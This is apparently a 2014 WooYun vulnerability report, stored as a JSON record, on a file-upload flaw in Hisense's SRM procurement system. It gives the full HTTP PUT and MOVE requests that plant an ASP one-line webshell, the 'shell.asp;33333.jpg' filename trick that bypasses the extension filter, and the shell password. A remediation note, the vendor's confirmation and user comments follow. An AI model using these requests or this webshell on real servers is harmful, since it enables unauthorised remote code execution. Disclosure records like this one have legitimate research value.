{"id": 47172, "wybug_id": "wooyun-2014-087840", "wybug_title": "海信集团某重要系统无需登录可getshell", "wybug_corp": "hisense.com", "wybug_author": "Mr.leo", "wybug_date": "2014-12-19 16:38", "wybug_open_date": "2015-02-02 16:40", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-02：\t细节向公众公开  简要描述： 海信集团某重要系统无需登录可getshell 详细说明：  http://srm.hisense.com:8001/SRMWeb/ 海信协同采购系统srm.hisense.com:8001/SRMWeb目录 http方法支持put move，上传脚本文件导致系统被getshell还有N个目录也可以执行，请厂商自己排除一下。首先，我们访问一个不存在的txt页面，记录下来get请求\nGET http://srm.hisense.com:8001/SRMWeb/3.txt HTTP/1.1Accept: application/x-ms-application, image/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*Accept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)Accept-Encoding: gzip, deflateProxy-Connection: Keep-AliveHost: srm.hisense.com:8001Cookie: ASPSESSIONIDQQRDATSQ=MFGPIKOBIEAJFGFICELEMADM\n接着put这个txt文件，并在put下面加入准备执行的脚本<%execute request(\"kn\")%>\nPUT /SRMWeb/3.txt HTTP/1.1Accept: application/x-ms-application, image/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*Accept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)Accept-Encoding: gzip, deflateProxy-Connection: Keep-AliveHost: srm.hisense.com:8001Cookie: ASPSESSIONIDQQRDATSQ=MFGPIKOBIEAJFGFICELEMADMContent-Length: 25<%execute request(\"kn\")%>\n201显示是成功的\n\n接着MOVE 加入Destination:http://srm.hisense.com:8001/SRMWeb/shell.asp;33333.jpg\nMOVE /SRMWeb/3.txt HTTP/1.1Accept: application/x-ms-application, image/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*Accept-Language: zh-CNDestination: http://srm.hisense.com:8001/SRMWeb/shell.asp;33333.jpgUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)Accept-Encoding: gzip, deflateProxy-Connection: Keep-AliveHost: srm.hisense.com:8001Cookie: ASPSESSIONIDQQRDATSQ=MFGPIKOBIEAJFGFICELEMADMContent-Length: 25<%execute request(\"kn\")%>\n\n\n201响应显示执行成功http://srm.hisense.com:8001/SRMWeb/shell.asp;33333.jpg 密码kn虽然系统禁止了某些目录的权限，任何脚本文件都无法上传成功，不过;.中间加了数字也可以绕过。\n\n   漏洞证明：  已经证明   修复方案：  禁用危险的http方法（put，move等）加强目录权限控制   版权声明：转载请注明来源 Mr.leo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-12-23 17:10 厂商回复： 感谢您提报的安全报告，我们已安排专人跟进修复，谢谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-19 17:01 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  大神最近暴动有点密集啊    \n     2014-12-19 17:05 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  我现在对厂商撸一下就换.......大神轻一点    \n     2014-12-19 18:10 |    \t\t毛猴 \t\t\t( 实习白帽子  |\t\t\t        Rank:63 漏洞数:18        | 一 只 怀 有 梦 想 的 猴 ......)\t\t \n  开始海信了？    \n     2014-12-19 22:51 |    \t\tYck \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 找个玩渗透网站的、教我玩渗透、我给他8位q...)\t\t \n  黑阔准备来个海信第三弹吗？    \n     2015-02-02 16:50 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  这么nb 啊！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}